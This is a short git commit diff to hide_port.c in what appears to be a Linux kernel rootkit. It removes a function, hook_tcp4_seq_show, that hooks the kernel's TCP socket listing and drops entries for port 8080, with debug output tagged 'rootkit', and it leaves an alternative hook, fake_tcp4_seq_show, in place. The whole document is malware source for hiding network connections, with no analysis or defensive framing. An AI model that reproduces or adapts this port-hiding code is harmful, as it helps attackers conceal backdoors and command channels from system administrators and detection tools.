002f609d00cb2b21fd1e520ba37091bab369b938
None <None>
2022-10-20 06:50:38 -0700

    delete a function hook_tcp4_seq_show in hide_port.c

--- hide_port.c
+++ hide_port.c
@@ -17,28 +17,6 @@ asmlinkage ssize_t (*real_sys_recvmsg)(const struct pt_regs *regs);
  * */
 asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
-/* This is our hook function for tcp4_seq_show */
-static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
-{
-    struct inet_sock *is;
-    long ret;
-    unsigned short port = htons(8080);
-
-    if (v != SEQ_START_TOKEN)
-    {
-        is = (struct inet_sock *)v;
-        if (port == is->inet_sport || port == is->inet_dport)
-        {
-            printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
-                   ntohs(is->inet_sport), ntohs(is->inet_dport));
-            return 0;
-        }
-    }
-
-    ret = orig_tcp4_seq_show(seq, v);
-    return ret;
-}
-
 
 /* This is our hook function for tcp4_seq_show */
 asmlinkage long fake_tcp4_seq_show(struct seq_file *seq, void *v)
